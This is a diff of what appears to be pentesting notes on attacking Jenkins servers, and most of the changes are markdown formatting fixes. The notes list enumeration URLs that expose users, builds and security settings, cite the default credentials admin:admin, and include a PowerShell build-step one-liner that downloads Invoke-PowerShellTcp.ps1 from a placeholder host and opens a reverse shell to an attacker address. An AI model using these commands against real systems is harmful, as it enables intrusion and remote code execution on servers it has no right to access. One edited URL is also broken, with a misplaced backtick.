@@ -8,15 +8,15 @@ An open-source automation server written in Java that helps developers build and
 
 * Jenkins runs on Tomcat port 8080 by default. It also utilizes port 5000 to attach slave servers. This port is used to communicate between masters and slaves.
 * Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. Administrators can also allow or disallow users from creating accounts.
-* **List of users**:  &#x20;http://\[jenkinsurl]/asynchPeople/
-* **List of all builds:**  &#x20;http://\[jenkinsurl]/view/All/builds  &#x20;<sup><sub>(Seems to be fixed in the latest version 1.575)<sub></sup>
-* **List publicly available content:**  &#x20;http://\[jenkinsurl]/userContent/
-* **Type of the Operating System:**  &#x20;http://\[jenkinsurl]/computer/
-* **Security Settings:** http://\[jenkinsurl]:8000/configureSecurity/
+* **List of users**: `http://[jenkinsurl]/asynchPeople/`
+* **List of all builds:** `http://[jenkinsurl]/view/All/build`s <sup><sub>(Seems to be fixed in the latest version 1.575)<sub></sup>
+* **List publicly available content:** `http://[jenkinsurl]/userContent/`
+* **Type of the Operating System:** `http://[jenkinsurl]/computer/`
+* **Security Settings:** `http://[jenkinsurl]:8000/configureSecurity/`
 
 ## Enumeration <a href="#jenkins-discovery-enumeration" id="jenkins-discovery-enumeration"></a>
 
-* &#x20;Default credentials such as `admin:admin` or does not have any type of authentication enabled.
+* Default credentials such as `admin:admin` or does not have any type of authentication enabled.
 
 ## Exploitation
 
@@ -52,13 +52,6 @@ An open-source automation server written in Java that helps developers build and
 ### Project Build Configuration
 
 * Add a build step, choose **"Execute Windows Batch Command"**
-* `powershell -c <command>`&#x20;
-* `powershell -eX (iwr -UseBasicParsing http://<ip>/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress <attacker-IP> -Port <attacker-port>`&#x20;
+* `powershell -c <command>`
+* `powershell -eX (iwr -UseBasicParsing http://<ip>/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress <attacker-IP> -Port <attacker-port>`
 * [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
-
-
-
-
-
-
-
